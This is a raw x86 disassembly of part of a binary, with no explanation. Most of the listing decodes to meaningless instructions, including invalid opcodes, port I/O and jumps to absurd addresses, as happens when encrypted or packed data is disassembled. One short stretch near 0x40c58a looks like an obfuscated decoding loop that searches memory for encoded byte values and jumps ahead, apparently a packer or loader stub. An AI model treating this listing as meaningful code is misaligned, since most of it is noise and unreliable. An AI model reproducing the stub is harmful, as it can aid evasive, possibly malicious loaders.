  40befd:	loope  0x40bf17
  40beff:	mov    ecx,0xf93ac037
  40bf04:	add    BYTE PTR [edx],bh
  40bf06:	mov    ebp,0x184b4619
  40bf0b:	in     eax,0x22
  40bf0d:	pop    ebp
  40bf0e:	add    BYTE PTR [ebx-0x60963dd2],dl
  40bf14:	xor    BYTE PTR [ebx+0x3b],bh
  40bf17:	mov    edi,0xcd59da45
  40bf1c:	test   eax,0xa66600b9
  40bf21:	mov    WORD PTR [edi-0x80],ss
  40bf24:	pop    es
  40bf25:	sbb    DWORD PTR [edx+0x12],esp
  40bf28:	jg     0x40beaa
  40bf2a:	mov    ch,0x2a
  40bf2c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bf2d:	sbb    BYTE PTR [ecx],ch
  40bf2f:	gs sahf 
  40bf31:	shl    DWORD PTR [ebx],cl
  40bf33:	or     ch,BYTE PTR [edx+edi*1-0x9b263f6]
  40bf3a:	mov    DWORD PTR [eax],esi
  40bf3c:	neg    BYTE PTR [esi+esi*8-0x5602acb]
  40bf43:	(bad)  
  40bf44:	dec    edi
  40bf45:	mov    esp,0x7249c78e
  40bf4a:	mov    al,0x4a
  40bf4c:	push   edi
  40bf4d:	jle    0x40bf9d
  40bf4f:	add    BYTE PTR [eax+eax*4+0x231b0f9],al
  40bf56:	mov    ah,0x6c
  40bf58:	scas   al,BYTE PTR es:[edi]
  40bf59:	adc    al,0x74
  40bf5b:	pushf  
  40bf5c:	scas   eax,DWORD PTR es:[edi]
  40bf5d:	pop    esi
  40bf5e:	adc    DWORD PTR [ecx],edi
  40bf60:	jl     0x40bef6
  40bf62:	out    0x1e,eax
  40bf64:	jne    0x40bef7
  40bf66:	sub    BYTE PTR [edx+0x6c],bh
  40bf69:	(bad)  
  40bf6a:	jg     0x40bfad
  40bf6c:	cmp    DWORD PTR [edi-0x43],ecx
  40bf6f:	aaa    
  40bf70:	sbb    dl,dh
  40bf72:	add    al,0x60
  40bf74:	sub    BYTE PTR ds:0xe1572e63,ah
  40bf7a:	xchg   ebp,eax
  40bf7b:	je     0x40bfb8
  40bf7d:	ror    BYTE PTR [eax+0x29],1
  40bf80:	push   ebx
  40bf81:	adc    BYTE PTR [ebp-0x3514a46f],cl
  40bf87:	into   
  40bf88:	pop    esi
  40bf89:	imul   eax,DWORD PTR ds:0xf5a1273c,0xffffffe9
  40bf90:	popf   
  40bf91:	pop    edx
  40bf92:	dec    ecx
  40bf93:	sbb    BYTE PTR [edx-0x6b],al
  40bf96:	sbb    ebx,DWORD PTR [esi-0x79]
  40bf99:	scas   al,BYTE PTR es:[edi]
  40bf9a:	mov    ebx,0x367132b1
  40bf9f:	ss icebp 
  40bfa1:	leave  
  40bfa2:	arpl   WORD PTR [ebx-0x471b4890],cx
  40bfa8:	clc    
  40bfa9:	adc    al,0x2f
  40bfab:	out    dx,al
  40bfac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bfad:	dec    ecx
  40bfae:	hlt    
  40bfaf:	(bad)  
  40bfb0:	sar    BYTE PTR ds:0xdcad1491,1
  40bfb6:	lahf   
  40bfb7:	pusha  
  40bfb8:	pusha  
  40bfb9:	mov    cl,0xe4
  40bfbb:	jo     0x40bfa5
  40bfbd:	ins    DWORD PTR es:[edi],dx
  40bfbe:	fidivr DWORD PTR [ecx+0x423567b3]
  40bfc4:	cmp    esp,DWORD PTR [ebx+0x24]
  40bfc7:	and    eax,0x32b22fd0
  40bfcc:	loop   0x40bf7d
  40bfce:	and    BYTE PTR [esi],ah
  40bfd0:	call   0x1656b906
  40bfd5:	outs   dx,BYTE PTR ds:[esi]
  40bfd6:	push   0x74cc1de0
  40bfdb:	arpl   WORD PTR [esi-0x217aec11],sp
  40bfe1:	xchg   edx,eax
  40bfe2:	int    0x91
  40bfe4:	repnz mov dh,0xa2
  40bfe7:	ins    BYTE PTR es:[edi],dx
  40bfe8:	mov    ds:0x98382041,al
  40bfed:	jae    0x40bffe
  40bfef:	sti    
  40bff0:	push   ss
  40bff1:	das    
  40bff2:	sub    eax,0xab8050b8
  40bff7:	enter  0xb3e5,0x7
  40bffb:	int3   
  40bffc:	retf   
  40bffd:	popf   
  40bffe:	mov    al,ds:0x1149e712
  40c003:	ficom  WORD PTR [edi+0x52]
  40c006:	out    dx,eax
  40c007:	leave  
  40c008:	pop    eax
  40c009:	shr    DWORD PTR [eax-0x7a2325a8],0x98
  40c010:	mov    ds:0xe696acc3,al
  40c015:	fdivr  QWORD PTR [ecx]
  40c017:	test   al,0x1b
  40c019:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c01a:	jecxz  0x40c067
  40c01c:	add    edx,edx
  40c01e:	ins    DWORD PTR es:[edi],dx
  40c01f:	or     cl,BYTE PTR ds:0xbf4c12f0
  40c025:	jbe    0x40bfbf
  40c027:	sbb    cl,BYTE PTR [ecx-0x4c9c2863]
  40c02d:	rcr    BYTE PTR [eax+ecx*2-0xce0f55a],0x7c
  40c035:	push   edi
  40c036:	pop    esp
  40c037:	dec    esp
  40c038:	add    ecx,DWORD PTR [edx-0x263bcc38]
  40c03e:	mov    eax,fs
  40c040:	adc    DWORD PTR [esi],esi
  40c042:	in     al,0xf7
  40c044:	mov    ebx,0x9c5c46a2
  40c049:	xchg   ecx,eax
  40c04a:	push   esp
  40c04b:	das    
  40c04c:	mov    edi,0x4d2c44c8
  40c051:	aad    0x2c
  40c053:	hlt    
  40c054:	sbb    bl,bh
  40c056:	or     DWORD PTR [edx],edi
  40c058:	out    dx,eax
  40c059:	pop    ecx
  40c05a:	mov    al,ds:0x8de5060d
  40c05f:	fimul  WORD PTR ds:0x7da467d1
  40c065:	ret    
  40c066:	xchg   esi,eax
  40c067:	fwait
  40c068:	inc    ebp
  40c069:	mov    edi,0x3c44ed09
  40c06e:	outs   dx,BYTE PTR ds:[esi]
  40c06f:	or     DWORD PTR [eax],0xb91634db
  40c075:	fdivr  QWORD PTR [esi+0x10]
  40c078:	mov    ebx,0xd307052e
  40c07d:	adc    al,0xab
  40c07f:	mov    edx,0x3635c5da
  40c084:	jo     0x40c0d6
  40c086:	or     BYTE PTR [ecx-0x7e],bl
  40c089:	aas    
  40c08a:	fiadd  WORD PTR [ebx+0x55311c8b]
  40c090:	sbb    bl,BYTE PTR [eax]
  40c092:	push   ebp
  40c093:	pop    edi
  40c094:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c095:	and    eax,0xad7a8d5f
  40c09a:	adc    eax,DWORD PTR [eax+0x37ae870b]
  40c0a0:	(bad)  
  40c0a1:	sub    edx,DWORD PTR [ecx+eax*8-0x767928b1]
  40c0a8:	int3   
  40c0a9:	mov    al,0xab
  40c0ab:	push   ebx
  40c0ac:	dec    esp
  40c0ad:	dec    esi
  40c0ae:	das    
  40c0af:	mov    esi,0x15f5d0a1
  40c0b4:	sub    al,0x8f
  40c0b6:	mov    cl,0x1f
  40c0b8:	dec    ebp
  40c0b9:	fstp   QWORD PTR [eax-0x65579b42]
  40c0bf:	xor    ebx,DWORD PTR [edi-0x5a5d4119]
  40c0c5:	ins    DWORD PTR es:[edi],dx
  40c0c6:	pop    eax
  40c0c7:	pop    esi
  40c0c8:	add    bl,BYTE PTR [edx-0x7ba5ee8d]
  40c0ce:	mov    al,0x35
  40c0d0:	mov    dl,0x45
  40c0d2:	sub    bl,dh
  40c0d4:	pop    DWORD PTR [esp+ebp*1+0x4c]
  40c0d8:	iret   
  40c0d9:	sbb    ebp,DWORD PTR [edi+esi*8+0x2088eaef]
  40c0e0:	mov    ah,dl
  40c0e2:	and    DWORD PTR [esi*4-0x65fe3cf6],eax
  40c0e9:	inc    ebx
  40c0ea:	dec    eax
  40c0eb:	push   ecx
  40c0ec:	xor    DWORD PTR [ecx+ebx*1],ecx
  40c0ef:	adc    eax,0x1d7eb7ba
  40c0f4:	cmp    DWORD PTR [edi],eax
  40c0f6:	loopne 0x40c08d
  40c0f8:	stc    
  40c0f9:	sub    al,0xa5
  40c0fb:	inc    edi
  40c0fc:	xchg   ebp,eax
  40c0fd:	jge    0x40c15c
  40c0ff:	or     BYTE PTR [ecx-0x3df8ed2b],dl
  40c105:	sbb    DWORD PTR [edi+eax*4],edx
  40c108:	inc    edi
  40c109:	push   edx
  40c10a:	and    BYTE PTR [eax+0xcbea00e],ch
  40c110:	aad    0x86
  40c112:	jp     0x40c10d
  40c114:	or     DWORD PTR [esi-0x30],ecx
  40c117:	jge    0x40c162
  40c119:	ja     0x40c161
  40c11b:	or     al,0x43
  40c11d:	mov    edx,0x66b29d84
  40c122:	clc    
  40c123:	rcr    DWORD PTR [ecx+0x44927098],1
  40c129:	inc    edi
  40c12a:	lods   eax,DWORD PTR ds:[esi]
  40c12b:	ds mov bl,0xa7
  40c12e:	fsubr  st(3),st
  40c130:	je     0x40c190
  40c132:	mov    ds:0x11fc193a,eax
  40c137:	out    dx,al
  40c138:	sub    esi,ebx
  40c13a:	into   
  40c13b:	jg     0x40c1b7
  40c13d:	or     DWORD PTR [ebx-0x5f],esp
  40c140:	les    ebp,FWORD PTR [ebx]
  40c142:	jmp    0x23712c4c
  40c147:	(bad)  
  40c148:	mov    ch,0x9d
  40c14a:	shl    BYTE PTR [ebx-0x60f05a25],0xc8
  40c151:	push   cs
  40c152:	mov    ds:0xf23c452c,eax
  40c157:	xlat   BYTE PTR ds:[ebx]
  40c158:	push   cs
  40c159:	nop
  40c15a:	data16 aas 
  40c15c:	test   BYTE PTR [ecx],ah
  40c15e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c15f:	aaa    
  40c160:	test   al,0xeb
  40c162:	cmc    
  40c163:	mov    ecx,DWORD PTR [ebp+0x714fc0b6]
  40c169:	or     BYTE PTR [ebp-0x49],bl
  40c16c:	lods   al,BYTE PTR ds:[esi]
  40c16d:	mov    dh,BYTE PTR [esi]
  40c16f:	push   edx
  40c170:	pop    edi
  40c171:	lock stos DWORD PTR es:[edi],eax
  40c173:	xchg   esi,eax
  40c174:	push   ebp
  40c175:	cmp    esi,eax
  40c177:	xor    eax,0x18bcde86
  40c17c:	stos   DWORD PTR es:[edi],eax
  40c17d:	jmp    0x40c113
  40c17f:	retf   
  40c180:	les    ecx,FWORD PTR [eax-0x311dc4d1]
  40c186:	xchg   ecx,eax
  40c187:	and    ebx,ebp
  40c189:	mov    DWORD PTR [edx+0x32],ecx
  40c18c:	inc    ebp
  40c18d:	sub    ebp,0xffffffb0
  40c190:	cmp    dl,dh
  40c192:	mov    al,0xa4
  40c194:	xchg   ebx,eax
  40c195:	mov    edx,0x84b762f8
  40c19a:	int3   
  40c19b:	add    cl,ch
  40c19d:	outs   dx,BYTE PTR ds:[esi]
  40c19e:	xchg   esi,eax
  40c19f:	ror    BYTE PTR [ecx-0x7b],1
  40c1a2:	(bad)  
  40c1a4:	mov    esi,0xdafeaa99
  40c1a9:	inc    edx
  40c1aa:	ins    DWORD PTR es:[edi],dx
  40c1ab:	retf   
  40c1ac:	packuswb mm7,mm4
  40c1af:	ss clc 
  40c1b1:	fmul   DWORD PTR [ebx-0x69]
  40c1b4:	cmc    
  40c1b5:	in     al,0xd2
  40c1b7:	inc    eax
  40c1b8:	xor    DWORD PTR [edi+ecx*1],0x5b211de
  40c1bf:	push   ecx
  40c1c0:	outs   dx,BYTE PTR ds:[esi]
  40c1c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c1c2:	clc    
  40c1c3:	pop    ds
  40c1c4:	ja     0x40c18a
  40c1c6:	js     0x40c15d
  40c1c8:	cmp    eax,0xffffffe4
  40c1cb:	mov    esp,0x724ba589
  40c1d0:	repnz in al,dx
  40c1d2:	je     0x40c209
  40c1d4:	retf   
  40c1d5:	pop    esp
  40c1d6:	xor    eax,esp
  40c1d8:	(bad)  [esi+ebx*4+0x6257e186]
  40c1df:	dec    ebp
  40c1e0:	mov    ds:0xbe9e318f,eax
  40c1e5:	xchg   ebp,eax
  40c1e6:	or     eax,0x2772893e
  40c1eb:	inc    eax
  40c1ec:	pop    ss
  40c1ed:	xchg   esi,eax
  40c1ee:	mov    bl,0x3b
  40c1f0:	cmp    bl,BYTE PTR [esi-0x27]
  40c1f3:	dec    esp
  40c1f4:	or     bl,BYTE PTR [eax+0x5f]
  40c1f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c1f8:	jae    0x40c229
  40c1fa:	inc    esp
  40c1fb:	jl     0x40c1d0
  40c1fd:	sbb    al,0x6
  40c1ff:	jg     0x40c1b6
  40c201:	push   0xbfe1668a
  40c206:	mov    al,0x1e
  40c208:	stos   BYTE PTR es:[edi],al
  40c209:	cmp    ah,BYTE PTR [ebx]
  40c20b:	xor    esp,0xfffffffa
  40c20e:	das    
  40c20f:	in     eax,0xa0
  40c211:	pushf  
  40c212:	int    0x32
  40c214:	les    edx,FWORD PTR [ebx-0x61850e58]
  40c21a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c21b:	sub    bh,al
  40c21d:	pop    ds
  40c21e:	aad    0xd9
  40c220:	xor    BYTE PTR [ebx+0x693b521d],dh
  40c226:	sub    ah,BYTE PTR [ebp+0x26265198]
  40c22c:	mov    al,0xc1
  40c22e:	es mov ecx,0xb231c46
  40c234:	mov    ebx,0x864cb293
  40c239:	stc    
  40c23a:	je     0x40c25b
  40c23c:	mov    ch,0x43
  40c23e:	push   0xc8c4ae72
  40c243:	aaa    
  40c244:	adc    ch,0x85
  40c247:	mov    eax,ds:0x241caad6
  40c24c:	imul   edi,DWORD PTR [ebx+eax*2-0x4e],0x37d828cd
  40c254:	push   0xffffffd2
  40c256:	xchg   edx,eax
  40c257:	scas   al,BYTE PTR es:[edi]
  40c258:	adc    eax,esi
  40c25a:	jo     0x40c2a7
  40c25c:	inc    ecx
  40c25d:	js     0x40c2b9
  40c25f:	mov    dh,0xc0
  40c261:	mul    DWORD PTR [ebx+0xf5a0bb6]
  40c267:	add    BYTE PTR [esi],bl
  40c269:	les    ebx,FWORD PTR [edx-0x548ece54]
  40c26f:	push   es
  40c270:	sahf   
  40c271:	xor    bh,BYTE PTR [eax-0x5f523cdf]
  40c277:	out    dx,eax
  40c278:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c279:	jae    0x40c281
  40c27b:	push   cs
  40c27c:	add    al,0x52
  40c27e:	push   0xffffffc5
  40c280:	push   ds
  40c281:	ds icebp 
  40c283:	and    ah,BYTE PTR [ebx-0x7d275194]
  40c289:	arpl   di,bp
  40c28b:	test   eax,0xc26608a7
  40c290:	add    eax,0x1bd72da9
  40c295:	fadd   QWORD PTR [ecx-0x38]
  40c298:	inc    ebx
  40c299:	xchg   esi,eax
  40c29a:	gs jae 0x40c2ff
  40c29d:	pop    ecx
  40c29e:	pop    ecx
  40c29f:	stc    
  40c2a0:	push   0xdbf146c
  40c2a5:	aas    
  40c2a6:	jns    0x40c31a
  40c2a8:	clc    
  40c2a9:	mov    ah,0xc4
  40c2ab:	scas   eax,DWORD PTR es:[edi]
  40c2ac:	fsub   st,st(4)
  40c2ae:	fs inc ebx
  40c2b0:	jg     0x40c31c
  40c2b2:	mov    esp,0x16a0760f
  40c2b7:	mov    ah,0x95
  40c2b9:	repnz push esp
  40c2bb:	fdivr  QWORD PTR [edi]
  40c2bd:	jecxz  0x40c270
  40c2bf:	xchg   edi,eax
  40c2c0:	dec    ebx
  40c2c1:	ds inc esi
  40c2c3:	xor    eax,0xdff16cbb
  40c2c8:	sub    eax,0xb8af0eaa
  40c2cd:	sub    eax,0xa8f40951
  40c2d2:	pop    es
  40c2d3:	mov    ebp,eax
  40c2d5:	push   ss
  40c2d6:	cmp    al,BYTE PTR [ecx+0x560a1985]
  40c2dc:	inc    ebx
  40c2dd:	icebp  
  40c2de:	adc    eax,0x2f59b7c3
  40c2e3:	mov    al,0x5b
  40c2e5:	xor    BYTE PTR [edx-0x18],bl
  40c2e8:	mov    ds:0x3398428,al
  40c2ed:	sti    
  40c2ee:	push   ds
  40c2ef:	sti    
  40c2f0:	add    edx,DWORD PTR [edi+ecx*1+0x7c3fdf60]
  40c2f7:	cmp    bl,0x52
  40c2fa:	int    0x12
  40c2fc:	and    al,bh
  40c2fe:	add    BYTE PTR [eax],ah
  40c300:	in     al,0xb
  40c302:	xchg   esp,eax
  40c303:	es pop edx
  40c305:	aaa    
  40c306:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c307:	adc    BYTE PTR [ebp+0x597d66a6],cl
  40c30d:	adc    ah,0xd9
  40c310:	lea    edx,[ecx+0x63]
  40c313:	fsubp  st(2),st
  40c315:	jb     0x40c37b
  40c317:	gs jmp 0xa58abcc6
  40c31d:	fucomi st,st(5)
  40c31f:	out    dx,eax
  40c320:	shl    DWORD PTR [ebx+0x6c],0x68
  40c324:	add    dh,BYTE PTR [edx-0x1e52e65b]
  40c32a:	or     BYTE PTR [esi-0x513b48d],dh
  40c330:	sub    eax,ebx
  40c332:	stos   BYTE PTR es:[edi],al
  40c333:	addr16 inc ebx
  40c335:	xchg   DWORD PTR [ebx],edx
  40c337:	scas   eax,DWORD PTR es:[edi]
  40c338:	enter  0x7cba,0x1e
  40c33c:	or     eax,0x66f57fb0
  40c341:	es dec edi
  40c343:	retf   
  40c344:	adc    DWORD PTR [edx-0x5d1dbe55],edi
  40c34a:	and    edx,DWORD PTR [esi-0x567c15ee]
  40c350:	add    eax,0x7fe8ad
  40c355:	mov    WORD PTR ss:[edi],es
  40c358:	loop   0x40c366
  40c35a:	dec    esi
  40c35b:	xchg   edi,eax
  40c35c:	fnstsw WORD PTR ds:0x24cc973
  40c362:	aad    0x25
  40c364:	(bad)  [ecx]
  40c366:	addr16 push cs
  40c368:	mov    esi,0xb94d9a51
  40c36d:	shl    BYTE PTR fs:[edi],cl
  40c370:	add    eax,edi
  40c372:	int    0x87
  40c374:	bound  edi,QWORD PTR [ecx-0x1a]
  40c377:	push   ds
  40c378:	mov    cl,0x65
  40c37a:	call   FWORD PTR [eax+0x3a]
  40c37d:	pop    es
  40c37e:	mov    al,ds:0x6b38eb6
  40c383:	cmp    al,0xf9
  40c385:	jne    0x40c3b8
  40c387:	cmc    
  40c388:	das    
  40c389:	bsr    ebx,eax
  40c38c:	inc    esp
  40c38d:	adc    ebp,DWORD PTR [ecx+0x4bead58c]
  40c393:	aam    0x9f
  40c395:	xchg   ebx,eax
  40c396:	cmc    
  40c397:	(bad)  [ecx]
  40c399:	inc    esi
  40c39a:	nop
  40c39b:	fcmovne st,st(7)
  40c39d:	fcmovu st,st(4)
  40c39f:	je     0x40c41e
  40c3a1:	rcl    cl,1
  40c3a3:	or     BYTE PTR [eax],0xd0
  40c3a6:	adc    DWORD PTR [ecx-0x122ae88c],ecx
  40c3ac:	push   ds
  40c3ad:	xchg   ebx,eax
  40c3ae:	and    al,0x4c
  40c3b0:	jp     0x40c375
  40c3b2:	inc    edi
  40c3b3:	sar    DWORD PTR [edx],1
  40c3b5:	jno    0x40c355
  40c3b7:	dec    esi
  40c3b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c3b9:	data16 loop 0x40c3a6
  40c3bc:	mov    esi,0xfbff1e21
  40c3c1:	or     al,0xfa
  40c3c3:	mov    ds:0x13b62939,al
  40c3c8:	scas   al,BYTE PTR es:[edi]
  40c3c9:	fcmovnb st,st(4)
  40c3cb:	das    
  40c3cc:	push   ebx
  40c3cd:	in     eax,0x21
  40c3cf:	inc    ecx
  40c3d0:	lds    ebx,FWORD PTR [ebx-0xa]
  40c3d3:	cld    
  40c3d4:	retf   0xf5a
  40c3d7:	in     al,dx
  40c3d8:	ss pop ss
  40c3da:	ss pop ebp
  40c3dc:	adc    al,0xf0
  40c3de:	push   esi
  40c3df:	cmp    eax,0x8dea9659
  40c3e4:	in     eax,0xb6
  40c3e6:	lods   al,BYTE PTR ds:[esi]
  40c3e7:	sbb    al,0x2d
  40c3e9:	inc    esp
  40c3ea:	retf   0xd6b8
  40c3ed:	ror    BYTE PTR [edx+0x22322857],0xaa
  40c3f4:	imul   ebx,eax,0xffffffb9
  40c3f7:	test   BYTE PTR [esi-0x31],0x41
  40c3fb:	adc    eax,0xd467ea9a
  40c400:	push   edx
  40c401:	adc    al,0xbb
  40c403:	mov    bl,0xc6
  40c405:	sub    ebx,DWORD PTR [edx]
  40c407:	inc    edi
  40c408:	test   eax,0xb0f1421d
  40c40d:	cmp    al,0x58
  40c40f:	pushf  
  40c410:	jo     0x40c471
  40c412:	inc    esi
  40c413:	jne    0x40c3a3
  40c415:	cmc    
  40c416:	jle    0x40c3ab
  40c418:	outs   dx,DWORD PTR ds:[esi]
  40c419:	pushf  
  40c41a:	sbb    DWORD PTR cs:[ebp+0x6d],ebx
  40c41e:	jg     0x40c3d7
  40c420:	inc    esp
  40c421:	xor    BYTE PTR [eax],dl
  40c423:	sbb    eax,0x4e53f08b
  40c428:	and    DWORD PTR [eax-0x3abdc6b1],0x77
  40c42f:	jg     0x40c432
  40c431:	cdq    
  40c432:	mov    ch,0x64
  40c434:	cmc    
  40c435:	pop    ebx
  40c436:	es push ds
  40c438:	sbb    ah,ah
  40c43a:	(bad)  
  40c43b:	daa    
  40c43c:	push   eax
  40c43d:	sbb    esp,esp
  40c43f:	leave  
  40c440:	hlt    
  40c441:	in     al,0xf6
  40c443:	sbb    DWORD PTR [edx+0x3e],edx
  40c446:	(bad)  
  40c447:	pop    ds
  40c448:	rcl    BYTE PTR [esi+0xe33155a],0xcf
  40c44f:	mov    ebp,0xd9c54622
  40c454:	outs   dx,DWORD PTR ds:[esi]
  40c455:	mov    dh,al
  40c457:	pop    esp
  40c458:	retf   0x620
  40c45b:	push   esp
  40c45c:	enter  0xd0ed,0xd2
  40c460:	jl     0x40c472
  40c462:	push   ecx
  40c463:	add    ch,BYTE PTR [edx-0x78f8c6e5]
  40c469:	sbb    al,BYTE PTR [edx]
  40c46b:	inc    ecx
  40c46c:	xchg   esi,eax
  40c46d:	inc    edx
  40c46e:	(bad)  
  40c46f:	mov    edi,0xaf27d3cd
  40c474:	and    BYTE PTR [eax*8-0x4e605315],ah
  40c47b:	jmp    0xf3d6c46b
  40c480:	adc    BYTE PTR [eax-0x4969cb19],bh
  40c486:	add    cl,BYTE PTR [ebp-0x59]
  40c489:	mov    esp,0xbd144dfa
  40c48e:	dec    eax
  40c48f:	js     0x40c414
  40c491:	pushf  
  40c492:	int3   
  40c493:	imul   edx,DWORD PTR [edi+edx*8-0x3a],0x9b2b6f12
  40c49b:	pop    ss
  40c49c:	and    bl,ah
  40c49e:	mov    cl,0xf5
  40c4a0:	pop    edx
  40c4a1:	cmp    al,BYTE PTR [eax-0x59fcc444]
  40c4a7:	test   BYTE PTR [ebx],ah
  40c4a9:	in     al,dx
  40c4aa:	adc    DWORD PTR [esi+eax*4+0x1b],0xe
  40c4af:	mov    bh,0xb1
  40c4b1:	int    0x12
  40c4b3:	mov    edi,0x7de9815f
  40c4b8:	in     al,dx
  40c4b9:	(bad)  
  40c4ba:	mov    ebp,0x2a8200b6
  40c4bf:	adc    esi,ebx
  40c4c1:	or     DWORD PTR [ebx-0x18],edx
  40c4c4:	rcl    BYTE PTR [esi],cl
  40c4c6:	xchg   esp,eax
  40c4c7:	mov    al,ds:0xd02d9d7c
  40c4cc:	pop    esi
  40c4cd:	or     edx,ebx
  40c4cf:	pushf  
  40c4d0:	(bad)  
  40c4d2:	and    DWORD PTR [ecx-0x746a13dc],esi
  40c4d8:	sub    DWORD PTR [ebx-0x6827a3ed],ebp
  40c4de:	sub    al,0xd0
  40c4e0:	xor    al,0x3e
  40c4e2:	or     BYTE PTR [esi],ah
  40c4e4:	and    BYTE PTR [edx],al
  40c4e6:	fistp  WORD PTR [edi+esi*2]
  40c4e9:	icebp  
  40c4ea:	sar    DWORD PTR [eax+0x2a],0x1e
  40c4ee:	arpl   WORD PTR fs:0x2ebac157,cx
  40c4f5:	sqrtps xmm7,XMMWORD PTR [ebx+0x4a]
  40c4f9:	xor    DWORD PTR [esp+ebp*2-0x7c554fca],ebx
  40c500:	cmp    dh,BYTE PTR [edi]
  40c502:	or     edi,DWORD PTR [edi+0x13]
  40c505:	add    cl,BYTE PTR [ebx-0x5714a752]
  40c50b:	jmp    0x40c562
  40c50d:	icebp  
  40c50e:	popa   
  40c50f:	xchg   ecx,eax
  40c510:	xchg   esp,eax
  40c511:	mov    cl,0x33
  40c513:	inc    esp
  40c514:	xchg   esp,eax
  40c515:	inc    esi
  40c516:	sub    ah,0x60
  40c519:	addr16 mov dh,0x43
  40c51c:	dec    ecx
  40c51d:	mov    BYTE PTR [esi-0x73],dh
  40c520:	test   eax,0x3c0e1b35
  40c525:	retf   0x966d
  40c528:	pop    ecx
  40c529:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c52a:	jmp    0x40c4da
  40c52c:	mov    ecx,0xe63f3ded
  40c531:	xchg   ecx,eax
  40c532:	or     ah,BYTE PTR [edi]
  40c534:	inc    ecx
  40c535:	dec    esi
  40c536:	sbb    DWORD PTR [ebp+0x70],edi
  40c539:	adc    BYTE PTR [ecx-0x45],bh
  40c53c:	mov    esp,0x2515862a
  40c541:	je     0x40c51d
  40c543:	inc    ebp
  40c544:	retf   
  40c545:	shl    DWORD PTR [esi-0x29f5c972],cl
  40c54b:	arpl   WORD PTR [ebp+ebx*8+0x6007cdd0],si
  40c552:	shl    BYTE PTR [eax-0x976d9a7],cl
  40c558:	int    0xf1
  40c55a:	fs in  eax,dx
  40c55c:	jg     0x40c560
  40c55e:	icebp  
  40c55f:	pop    ebx
  40c560:	repz out dx,eax
  40c562:	mov    cl,0x2d
  40c564:	imul   ebx,ebp,0x3ee13687
  40c56a:	xchg   edx,eax
  40c56b:	inc    ebx
  40c56c:	cmp    DWORD PTR [eax],esp
  40c56e:	lahf   
  40c56f:	enter  0xb03,0xe3
  40c573:	and    DWORD PTR [ebp-0x43e448b6],edx
  40c579:	in     eax,0xf6
  40c57b:	icebp  
  40c57c:	je     0x40c517
  40c57e:	jg     0x40c50a
  40c580:	add    eax,0x1ee0d927
  40c585:	mov    eax,0x13207559
  40c58a:	mov    ebx,0x37ec02c
  40c58f:	cmp    BYTE PTR [ecx+0x458bf87d],cl
  40c595:	or     al,0x8b
  40c597:	jge    0x40c5a5
  40c599:	xor    edi,ecx
  40c59b:	xor    eax,ecx
  40c59d:	lea    eax,[eax+edi*1+0x64e5c4]
  40c5a4:	mov    edi,DWORD PTR [ebp+0xc]
  40c5a7:	xor    edi,ecx
  40c5a9:	add    edi,edx
  40c5ab:	imul   eax,edi
  40c5ae:	mov    edi,DWORD PTR [ebp+0xc]
  40c5b1:	xor    edi,ecx
  40c5b3:	sub    edi,eax
  40c5b5:	mov    eax,DWORD PTR [ebp-0x4]
  40c5b8:	add    edi,edx
  40c5ba:	cmp    DWORD PTR [eax],edi
  40c5bc:	mov    eax,DWORD PTR [ebp-0x4]
  40c5bf:	mov    edi,DWORD PTR [ebp+0x10]
  40c5c2:	jg     0x40c5d5
  40c5c8:	xor    edi,ecx
  40c5ca:	mov    ebx,esi
  40c5cc:	sub    ebx,edi
  40c5ce:	add    DWORD PTR [eax],ebx
  40c5d0:	jmp    0x40c5db
  40c5d5:	xor    edi,ecx
  40c5d7:	add    edi,edx
  40c5d9:	add    DWORD PTR [eax],edi
  40c5db:	mov    eax,DWORD PTR [ebp-0x8]
  40c5de:	mov    edi,DWORD PTR [ebp-0x10]
  40c5e1:	mov    eax,DWORD PTR [eax]
  40c5e3:	xor    edi,ecx
  40c5e5:	add    edi,0x3272e1
  40c5eb:	not    edi
  40c5ed:	and    eax,edi
  40c5ef:	movsx  di,BYTE PTR [eax+0x1]
  40c5f4:	mov    ebx,0x3b51
  40c5f9:	sub    di,bx
  40c5fc:	mov    ebx,0x8a8d
  40c601:	xor    di,bx
  40c604:	mov    ebx,0x4f84
  40c609:	cmp    di,bx
  40c60c:	jne    0x40c634
  40c612:	movsx  di,BYTE PTR [eax]
  40c616:	mov    ebx,0x3b51
  40c61b:	sub    di,bx
  40c61e:	mov    ebx,0x8a8d
  40c623:	xor    di,bx
  40c626:	mov    ebx,0x4e71
  40c62b:	cmp    di,bx
  40c62e:	je     0x40c644
  40c634:	mov    edi,DWORD PTR [ebp-0x10]
  40c637:	xor    edi,ecx
  40c639:	mov    ebx,esi
  40c63b:	sub    ebx,edi
  40c63d:	add    eax,ebx
  40c63f:	jmp    0x40c5ef
  40c644:	mov    esi,DWORD PTR [ebp-0x14]
  40c647:	mov    esi,DWORD PTR [esi]
  40c649:	jmp    0x40e998
  40c64e:	dec    edi
  40c64f:	sub    edi,esi
  40c651:	pusha  
  40c652:	repz inc edx
  40c654:	or     esi,ebx
  40c656:	test   eax,0x7d4b873c
  40c65b:	jno    0x40c651
  40c65d:	js     0x40c601
  40c65f:	loopne 0x40c6dd
  40c661:	jl     0x40c6b1
  40c663:	pop    edi
  40c664:	jl     0x40c6e2
  40c666:	jae    0x40c6bb
  40c668:	enter  0xf65,0x9b
  40c66c:	js     0x40c654
  40c66e:	mov    ch,0x58
  40c670:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c671:	dec    edx
  40c672:	fwait
  40c673:	dec    esi
  40c674:	xlat   BYTE PTR ds:[ebx]
  40c675:	cmp    DWORD PTR [edx-0x79cd38eb],eax
  40c67b:	or     DWORD PTR ds:0xeac7fc06,ecx
  40c681:	mov    bh,0xfc
  40c683:	pop    eax
  40c684:	out    0xc1,al
  40c686:	shl    BYTE PTR [esi+0xb53c441],0xaa
  40c68d:	sbb    eax,0xbd705119
  40c692:	retf   
  40c693:	out    dx,eax
  40c694:	push   ebx
  40c695:	sahf   
  40c696:	out    dx,eax
